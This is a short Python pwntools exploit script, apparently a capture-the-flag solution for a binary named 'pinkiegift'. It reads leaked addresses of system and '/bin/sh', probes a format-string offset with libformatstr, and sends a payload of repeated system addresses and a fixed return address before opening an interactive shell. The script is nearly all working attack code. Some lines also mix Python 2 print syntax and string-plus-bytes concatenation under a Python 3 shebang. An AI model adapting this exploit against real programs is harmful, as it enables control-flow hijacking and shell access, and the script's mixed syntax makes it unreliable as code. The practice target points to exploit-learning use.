#!/usr/bin/env python3
from pwn import *
from libformatstr import *

e = ELF('./pinkiegift')
#print e.symbols['ret2libc']
#for symbol in e.symbols:
#	print symbol + " " + hex(e.symbols[symbol])

r = process('./pinkiegift')
out = r.recvline(timeout=1)

addr_system=out.split()[-1]
addr_bin_sh=out.split()[-2]


print(addr_system)
print(addr_bin_sh)
#print(p32(int(addr_system,16)))
#print(p32(4158311840))
#print(int(addr_system,16))
#r.send(b"/////////////////////bin/sh"+b"\n")
#r.send(b"hahahaha"+b"\n")
bufsiz = 100
r.send(make_pattern(bufsiz) + "\n")             # send cyclic pattern to server
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
print("offset: " + str(offset))
print("padding: " + str(padding))

r.send(p32(int(addr_system,16))*36+p32(0x8048f48)+b"\n")
#r.send(b"AAAA\n")

#r.send("A"*135 + "\n")
out = r.recv()
print out
#print(p32(int(addr_system,16)))
r.interactive()

r.close()

